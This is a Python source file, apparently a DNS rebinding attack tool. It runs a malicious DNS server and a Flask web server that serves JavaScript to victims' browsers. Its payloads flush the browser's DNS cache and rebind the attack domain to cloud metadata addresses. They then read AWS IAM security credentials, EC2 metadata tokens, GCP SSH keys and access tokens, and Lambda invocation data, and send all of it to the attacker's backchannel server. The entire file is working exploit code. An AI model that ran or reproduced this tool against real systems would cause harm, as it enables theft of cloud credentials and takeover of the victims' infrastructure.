import sys
import time
import threading
import socketserver  # Updated from SocketServer
import struct
from dnslib import *

from flask import Flask, request
from flask_cors import CORS, cross_origin
from time import sleep


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


if len(sys.argv) < 4:
    print('Usage: httprebind.py domain.name serverIp (ec2|ecs|gcloud)', file=sys.stderr)
    sys.exit(1)

base = sys.argv[1]
serverIp = sys.argv[2]
mode = sys.argv[3]

D = DomainName(base + '.')
IP = serverIp
TTL = 0
waits = 0

soa_record = SOA(
    mname=D.ns1,  # primary name server
    rname=D.daeken,  # email of the domain administrator
    times=(
        201307231,  # serial number
        0,  # refresh
        0,  # retry
        0,  # expire
        0,  # minimum
    )
)
ns_records = [NS(D.ns1), NS(D.ns2)]
records = {
    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
    D.ns1: [A(IP)],
    D.ns2: [A(IP)], 
    D.ex.bc: [A(IP)], 
    D.ex: [A(IP)], 
}

base = D.ex
for i in range(2500):  # Updated xrange to range
    records[getattr(base, 'a%i' % i)] = [A(IP)]

def dns_response(data):
    try:
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    except:
        return b''

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    if base in str(qname) and not str(qname).startswith('a'):
        print('DNS request for:', str(qname).strip('.'))

    if qn == D or qn.endswith('.' + D):
        for name, rrs in records.items():
            if name == qn:
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:
                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))

        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):  # Updated from SocketServer
    def handle(self):
        try:
            self.send_data(dns_response(self.get_data()))
        except Exception:
            pass


class TCPRequestHandler(BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz != len(data) - 2:
            raise Exception('Wrong size of TCP packet')
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)

class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

app = Flask(__name__)
CORS(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

boilerplate = '''
<img src="loaded">
<script>
var backchannelServer = 'bc.$BASE$:9001';
var attackServer = '$BASE$:9001';

function log(data) {
    var sreq = new XMLHttpRequest();
    sreq.open('GET', 'http://' + backchannelServer + '/log?msg=' + encodeURI(data), false);
    sreq.send();
}

function get(url, exp) {
    try {
        var req = new XMLHttpRequest();
        req.open('GET', url, false);
        req.setRequestHeader('X-Google-Metadata-Request', 'True');
        req.send(null);
        if(req.status == 200)
            return req.responseText;
        else
            return '[failed status=' + req.status + ']';
    } catch(err) {
        if(exp !== false)
            log(err);
    }
    return null;
}

log('Starting...');
var req = new XMLHttpRequest();
req.open('GET', 'http://' + backchannelServer + '/rebind', false);
req.send();

var reqs = [];
var dnsFlush = 2500;
log('Flushing DNS');
for(var i = 0; i < dnsFlush; ++i) {
    var req = reqs[i] = new XMLHttpRequest();
    //req.open('GET', 'http://a' + i + attackServer + '/', true);
    req.open('GET', 'http://a' + i + attackServer + '/', true);
    req.send(null);
}
while(true) {
    var hit = 0;
    for(var i = 0; i < dnsFlush; ++i) {
        if(reqs[i].readyState == 0)
            break;
        hit++;
    }
    if(hit == dnsFlush)
        break;
}
log('DNS Flushed');

%s
</script>'''.replace('$BASE$', base)

ec2Code = '''
var role;
for(var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();
    role = get('http://' + attackServer + '/latest/meta-data/iam/security-credentials/');
    if(role != 'still the same host')
    	break;
}
log('Role: ' + role);
log('Security credentials: ' + get('http://' + attackServer + '/latest/meta-data/iam/security-credentials/' + role));
log('AMI id: ' + get('http://' + attackServer + '/latest/meta-data/ami-id'));
'''

ecsCodev2bak = '''
var token, metadata;
for (var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();

    // Fetch the token from the EC2 instance metadata service
    var tokenReq = new XMLHttpRequest();
    tokenReq.open('PUT', 'http://' + attackServer + '/latest/api/token', false);
    tokenReq.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
    tokenReq.send();
    token = tokenReq.responseText;

    if (token != 'still the same host') 
        break;
}

log('EC2 Metadata Token: ' + token);

// Use the token to fetch metadata
var metadataReq = new XMLHttpRequest();
metadataReq.open('GET', 'http://' + attackServer + '/latest/meta-data', false);
metadataReq.setRequestHeader('X-aws-ec2-metadata-token', token);
metadataReq.send();

metadata = metadataReq.responseText;
log('EC2 Metadata: ' + metadata);


'''

ecsCodev2 = '''
var token, metadata;
for (var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();

    // Fetch the token from the EC2 instance metadata service
    var tokenReq = new XMLHttpRequest();
    tokenReq.open('PUT', 'http://' + attackServer + '/latest/api/token', false);
    tokenReq.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
    tokenReq.send();
    token = tokenReq.responseText;
    log('EC2 Metadata Token: ' + token);

    // Use the token to fetch metadata
    var metadataReq = new XMLHttpRequest();
    metadataReq.open('GET', 'http://' + attackServer + '/latest/meta-data', false);
    metadataReq.setRequestHeader('X-aws-ec2-metadata-token', token);
    metadataReq.send();

    metadata = metadataReq.responseText;

    if (token != 'still the same host') 
        break;
}

log('EC2 Metadata: ' + metadata);

'''

ecsCode = '''
var meta;
for(var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();
    meta = get('http://' + attackServer + '/v2/metadata');
    if(meta != 'still the same host')
    	break;
}
log('Meta: ' + meta);
'''

gcloudCode = '''
var sshkeys;
for(var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();
    sshkeys = get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json');
    if(sshkeys != 'still the same host')
    	break;
}
log('SSH keys: ' + sshkeys);
log('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));
log('Access token: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/default/token'));
'''

lambdaCode = '''
var invocationData;
for(var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + backchannelServer + '/wait', false);
    req.send();
	invocationData = get('http://' + attackServer + '/2018-06-01/runtime/invocation/next');
    if (invocationData != 'still the same host') {
        break;
        
    }}
    
log('Local invocation data: ' + invocationData);
'''

@app.route('/')
def index():
	if mode == 'ec2':
		return boilerplate % ec2Code
	elif mode == 'ec2v2':
			return boilerplate % ecsCodev2
	elif mode == 'ecs':
		return boilerplate % ecsCode
	elif mode == 'gcloud':
		return boilerplate % gcloudCode
	elif mode == 'lam':
		return boilerplate % lambdaCode
		
	assert False

waits = 0
@app.route('/wait')
@cross_origin()
def wait():
    global waits
    waits += 1
    print('Wait', waits)
    sleep(1)
    return 'waited'

@app.route('/log')
@cross_origin()
def log():
    print(request.args['msg'])
    return 'logged'

@app.route('/rebind')
@cross_origin()
def rebind():
    print('Rebound DNS')
    if mode == 'lam':
        records[D.ex][0] = A('127.0.0.1')
    elif mode in ['ecs']:
        records[D.ex][0] = A('169.254.170.2')
    elif mode == 'ec2v2':
	    records[D.ex][0] = A('169.254.169.254')
    else:
        records[D.ex][0] = A('169.254.169.254')
    return 'rebound'

@app.route('/loaded')
def loaded():
    print('Page loaded')
    return 'loaded'

@app.route('/latest/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
@app.route('/computeMetadata/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
@app.route('/v2/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
@app.route('/latest/api/token', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
@app.route('/2018-06-01/runtime/invocation/next', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def nil(subpath=None):
    return 'still the same host'


def main():
    port = 53
    servers = [
        socketserver.ThreadingUDPServer(('', port), UDPRequestHandler).serve_forever,
        socketserver.ThreadingTCPServer(('', port), TCPRequestHandler).serve_forever,
        lambda: app.run(host='0.0.0.0', port=9001, debug=True, use_reloader=False)
    ]

    for s in servers:
        thread = threading.Thread(target=s)
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(0.1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        sys.exit()

if __name__ == '__main__':
    main()


